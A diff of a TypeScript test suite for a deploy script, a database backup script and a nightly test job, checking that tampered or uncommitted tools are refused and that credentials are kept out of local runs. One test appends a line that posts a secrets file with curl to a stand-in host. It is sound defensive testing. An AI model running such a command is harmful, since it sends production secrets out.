@@ -31,6 +31,7 @@ import { verify, isReusableProof, lastDeployed, LOCAL_GATES } from '../../../../
 const ROOT = join(dirname(fileURLToPath(import.meta.url)), '../../../..');
 const SHIP = join(ROOT, 'infra/aws/ship.sh');
 const BACKUP = join(ROOT, 'infra/aws/backup/rawprod-backup.sh');
+const NIGHTLY = join(ROOT, 'infra/aws/nightly-proof.sh');
 const src = readFileSync(SHIP, 'utf8');
 const dirs: string[] = [];
 after(() => dirs.forEach((d) => rmSync(d, { recursive: true, force: true })));
@@ -168,7 +169,7 @@ printf '%s' "$(cat "${join(state, 'reply', 'curl')}" 2>/dev/null || echo 200)"`)
     });
   };
   const worktrees = () => g(clone, 'worktree', 'list').split('\n').length;
-  return { dir, clone, state, base, head, deploySh, g, put, run, calls, order, reply, sent, evidence, worktrees,
+  return { dir, bin, env, clone, state, base, head, deploySh, g, put, run, calls, order, reply, sent, evidence, worktrees,
     pnpm: () => readFileSync(join(state, 'pnpm.log'), 'utf8') };
 }
 
@@ -477,6 +478,18 @@ test('a backup that is not this run\'s, or not the size the box dumped, is not a
   assert.notEqual(c.code, 0);
   assert.match(c.out, /cannot be read back\. No deploy was started/);
   assert.equal(gone.order().includes('deploy'), false);
+});
+
+test('a backup the box calls OK is still judged here: under the floor it is not this database', () => {
+  // The box checks its own floor; that is the box's word about its own run. The laptop checks again.
+  const r = rig();
+  r.reply('backup.out', 'rawprod-backup OK bucket=b key=rawprod/pg_dump/99991231T235959Z.dump bytes=1200 sha256=abc entries=3 tables=1');
+  r.reply('s3.bytes', '1200');
+  const x = r.run([r.head, '--apply']);
+  assert.notEqual(x.code, 0);
+  assert.match(x.out, /is 1200 bytes, under the floor of 500000: that is not this database\. No deploy was started/);
+  assert.equal(r.order().includes('deploy'), false);
+  assert.equal(r.order().pop(), 'lock-release');
 });
 
 test('a failed deploy.sh publishes no console, prints the way back, and releases the lock', () => {
@@ -820,7 +833,171 @@ test('rawprod-backup.sh: an archive that is too small, holds no table data, or h
   assert.match(c.err, /so the database URL cannot be read/);
 });
 
+// ── nothing local can reach production ──────────────────────────────────────────────────────────────
+
+const TOOL_FILES = ['infra/aws/ship.sh', 'infra/aws/ship-evidence.mjs', 'infra/aws/deploy.sh', 'infra/aws/backup/rawprod-backup.sh',
+  'infra/aws/fast-proof-always.txt', 'scripts/touched-tests.mjs'];
+
+/** A committed copy of the tools, so a test can dirty them without touching this checkout. */
+function toolsCopy() {
+  const t = mkdtempSync(join(tmpdir(), 'ship-rp-tools-'));
+  dirs.push(t);
+  for (const f of TOOL_FILES) { mkdirSync(dirname(join(t, f)), { recursive: true }); writeFileSync(join(t, f), readFileSync(join(ROOT, f))); }
+  chmodSync(join(t, 'infra/aws/ship.sh'), 0o755);
+  const g = (...a: string[]) => execFileSync('git', ['-C', t, '-c', 'user.name=t', '-c', 'user.email=t@t', ...a], { encoding: 'utf8' });
+  g('init', '--quiet', '-b', 'main'); g('add', '.'); g('commit', '--quiet', '-m', 'tools');
+  return t;
+}
+
+test('a checkout with uncommitted changes is refused, on a dry run too, before anything is built or asked', () => {
+  const r = rig();
+  r.put('web/index.html', '<html>edited, not committed</html>\n');
+  const x = r.run([r.head]);
+  assert.notEqual(x.code, 0);
+  assert.match(x.out, /has uncommitted changes, so what you have been looking at is not the commit you named/);
+  assert.match(x.out, /M web\/index\.html/);
+  assert.match(x.out, /Not git stash/);
+  assert.equal(r.pnpm(), '');
+  assert.deepEqual(r.calls(), []);
+  // An untracked file is not part of any commit and is not refused.
+  r.g(r.clone, 'checkout', '--quiet', '--', 'web/index.html');
+  r.put('scratch.txt', 'notes\n');
+  assert.equal(r.run([r.head]).code, 0);
+});
+
+test('a ship.sh, wrapper or backup script nobody committed never runs: they go to the box as root', () => {
+  const r = rig();
+  const t = toolsCopy();
+  const ship = join(t, 'infra/aws/ship.sh');
+  const go = (args: string[]) => { const p = spawnSync('bash', [ship, ...args], { encoding: 'utf8', env: r.env }); return { code: p.status, out: `${p.stdout}${p.stderr}` }; };
+  const clean = go([r.head]);
+  assert.equal(clean.code, 0, `clean tools: the dry run passes\n${clean.out}`);
+  writeFileSync(join(t, 'infra/aws/backup/rawprod-backup.sh'), readFileSync(BACKUP, 'utf8') + 'curl -d @/etc/rawprod/migrate.env https://example.invalid\n');
+  const before = r.pnpm();
+  for (const args of [[r.head, '--apply'], ['--rollback', '--apply'], ['--unlock', '--apply']]) {
+    const x = go(args);
+    assert.notEqual(x.code, 0, args.join(' '));
+    assert.match(x.out, /differ from its HEAD, and ship\.sh runs them or sends them to the box as root/);
+    assert.match(x.out, /M infra\/aws\/backup\/rawprod-backup\.sh/);
+  }
+  assert.deepEqual(r.calls(), [], 'nothing was read or sent');
+  assert.equal(r.pnpm(), before, 'nothing was built');
+});
+
+test('the operator\'s database URLs and AWS credentials never reach a local gate, and no value is printed', () => {
+  const r = rig();
+  const seen = join(r.state, 'env-seen');
+  stub(r.bin, 'pnpm', `echo "pnpm $*" >> "${join(r.state, 'pnpm.log')}"
+env | grep -E '^(DATABASE_URL|FORMULA_DATABASE_URL|PGPASSWORD|PGHOST|AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|AWS_PROFILE|AWS_CONFIG_FILE|AWS_SHARED_CREDENTIALS_FILE)=' >> "${seen}" || true`);
+  const secret = 'hunter2-prod-only';
+  const x = r.run([r.head], {
+    DATABASE_URL: `postgres://owner:${secret}@prod.example:5432/rawprod`, FORMULA_DATABASE_URL: `postgres://v:${secret}@vault.example/f`,
+    PGPASSWORD: secret, PGHOST: 'prod.example', AWS_ACCESS_KEY_ID: 'AKIAEXAMPLE', AWS_SECRET_ACCESS_KEY: secret, AWS_PROFILE: 'rawaroma',
+  });
+  assert.equal(x.code, 0, x.out);
+  const lines = readFileSync(seen, 'utf8').split('\n').filter(Boolean);
+  assert.ok(lines.length > 0, 'the stub ran');
+  for (const l of lines) assert.match(l, /^AWS_(CONFIG_FILE|SHARED_CREDENTIALS_FILE)=\/dev\/null$/, `a local gate saw ${l}`);
+  assert.match(x.out, /removed from this run's environment \(names only\): .*DATABASE_URL.*PGPASSWORD/);
+  assert.doesNotMatch(x.out, new RegExp(secret));
+  const e = r.evidence().pop()!;
+  assert.doesNotMatch(JSON.stringify(e), new RegExp(secret), 'nor is a value written to the evidence');
+  // --apply still reaches AWS: the profile is the script's, captured before the scrub, and passed by flag.
+  const a = rig();
+  assert.equal(a.run([a.head, '--apply'], { AWS_PROFILE: 'rawaroma', DATABASE_URL: 'postgres://x@prod.example/rawprod' }).code, 0);
+});
+
+test('ship.sh refuses to run under a shell that is not bash, whose paths would be wrong', () => {
+  const shells = ['zsh', 'dash'].filter((s) => spawnSync('sh', ['-c', `command -v ${s}`]).status === 0);
+  for (const sh of shells) {
+    const p = spawnSync(sh, [SHIP, 'HEAD'], { encoding: 'utf8' });
+    assert.equal(p.status, 2, `${sh}: ${p.stdout}${p.stderr}`);
+    assert.match(`${p.stdout}${p.stderr}`, /is a bash script/);
+  }
+  // And wherever neither shell exists, the guard is still the first thing that runs.
+  assert.ok(src.indexOf('[ -n "${BASH_VERSION:-}" ] ||') < src.indexOf('set -euo pipefail'));
+});
+
+// ── the nightly job ─────────────────────────────────────────────────────────────────────────────────
+
+const nsrc = readFileSync(NIGHTLY, 'utf8');
+
+test('nightly-proof.sh makes no AWS call and writes nothing a deploy reads', () => {
+  execFileSync('bash', ['-n', NIGHTLY]);
+  const code = nsrc.split('\n').filter((l) => !/^\s*#/.test(l)).join('\n');
+  assert.doesNotMatch(code, /\baws (s3api|s3|rds|sns|ssm|ec2|sts)\b/);
+  assert.doesNotMatch(code, /pkill|killall/);
+  // Its one use of the ship evidence is a read: which commit went green last.
+  assert.deepEqual([...code.matchAll(/\$EVIDENCE_ROOT/g)].length, 1);
+  assert.match(code, /ship-evidence\.mjs" last-deployed --root "\$EVIDENCE_ROOT"/);
+  assert.match(code, /OUT_ROOT="\$\{RAWPROD_NIGHTLY_DIR:-\$HOME\/\.rawprod\/nightly\}"/);
+  // The browser walks are not a default leg, and when asked for, e2e:down runs on every exit.
+  assert.match(code, /^SHA_ARG=""; LEGS="typecheck,unit";/m);
+  assert.match(nsrc.slice(nsrc.indexOf('finish() {'), nsrc.indexOf('trap finish EXIT')), /pnpm e2e:down/);
+  for (const wf of ['unit-tests', 'browser-suite']) {
+    const y = read(`.github/workflows/${wf}.yml`);
+    assert.match(y, /schedule:\n\s+- cron: '30 20 \* \* \*'/, `${wf}.yml runs every night`);
+    assert.match(y, /workflow_dispatch:/);
+  }
+});
+
+test('nightly-proof.sh: a plan runs nothing; a run writes the verdict where ship.sh reads it; a red one is red', () => {
+  const r = rig();
+  const night = (args: string[], extra: Record<string, string> = {}) => {
+    const p = spawnSync('bash', [NIGHTLY, ...args], { encoding: 'utf8', env: { ...r.env, ...extra } });
+    return { code: p.status, out: `${p.stdout}${p.stderr}` };
+  };
+  const plan = night(['--plan']);
+  assert.equal(plan.code, 0, plan.out);
+  assert.match(plan.out, /WOULD RUN: pnpm test, every file/);
+  assert.match(plan.out, /NOT RUN: the browser walks/);
+  assert.equal(r.pnpm(), '');
+
+  const green = night(['--legs', 'typecheck']);
+  assert.equal(green.code, 0, green.out);
+  const latest = join(r.dir, '.rawprod', 'nightly', 'latest.json');
+  const doc = JSON.parse(readFileSync(latest, 'utf8')) as { verdict: string; sha: string; legs: { name: string; status: string }[]; not_run: string[] };
+  assert.equal(doc.verdict, 'GREEN');
+  assert.equal(doc.sha, r.base, 'by default, the commit production runs (here RAWPROD_DEPLOYED_SHA)');
+  assert.deepEqual(doc.legs.map((l) => `${l.name}:${l.status}`), ['install:ok', 'typecheck:ok']);
+  assert.ok(doc.not_run.some((n) => /^unit: not asked for/.test(n)));
+  assert.match(r.pnpm(), /typecheck/);
+  assert.match(night(['--legs', 'typecheck']).out, /NOTHING NEW/);
+  assert.equal(r.worktrees(), 1, 'its worktree is removed');
+  assert.deepEqual(r.calls(), [], 'and AWS was asked nothing');
+
+  stub(r.bin, 'pnpm', `case "$*" in *typecheck*) exit 1 ;; esac`);
+  const red = night(['--legs', 'typecheck', '--force']);
+  assert.equal(red.code, 1, red.out);
+  assert.match(red.out, /VERDICT: RED/);
+  assert.equal(JSON.parse(readFileSync(latest, 'utf8')).verdict, 'RED');
+
+  // ship.sh prints it in front of the person deploying, and ships anyway: a report, not a gate.
+  stub(r.bin, 'pnpm', `echo "pnpm $*" >> "${join(r.state, 'pnpm.log')}"`);
+  const ship = r.run([r.head]);
+  assert.equal(ship.code, 0, ship.out);
+  assert.match(ship.out, /nightly: RED [0-9a-f]{8}/);
+  assert.match(ship.out, /FAILED +typecheck/);
+  assert.match(ship.out, /A red nightly is a defect that is already in production/);
+});
+
 // ── the script text ─────────────────────────────────────────────────────────────────────────────────
+
+test('the two CLIs run when reached through a symlink: /tmp and /var are /private on macOS', () => {
+  // A string compare of argv[1] against the module's own path made both a silent no-op there: exit 0, no
+  // output. ship.sh then had no test selection, and an evidence path it printed named a file never written.
+  const d = mkdtempSync(join(tmpdir(), 'ship-rp-link-'));
+  dirs.push(d);
+  execFileSync('ln', ['-s', join(ROOT, 'infra/aws'), join(d, 'aws')]);
+  execFileSync('ln', ['-s', join(ROOT, 'scripts'), join(d, 'scripts')]);
+  const ev = spawnSync(process.execPath, [join(d, 'aws/ship-evidence.mjs')], { encoding: 'utf8' });
+  assert.equal(ev.status, 2, 'usage, from main()');
+  assert.match(ev.stderr, /usage: ship-evidence\.mjs/);
+  const tt = spawnSync(process.execPath, [join(d, 'scripts/touched-tests.mjs')], { encoding: 'utf8' });
+  assert.notEqual(tt.status, 0, `main() ran and refused the missing arguments: ${tt.stdout}${tt.stderr}`);
+  assert.match(src, /\[ -s "\$WORK\/selection\.json" \] \|\| die/);
+  assert.match(src, /write --work "\$WORK" --out "\$out\/ship\.json" && \[ -s "\$out\/ship\.json" \]/);
+});
 
 test('ship.sh and the backup script are valid bash', () => {
   execFileSync('bash', ['-n', SHIP]);
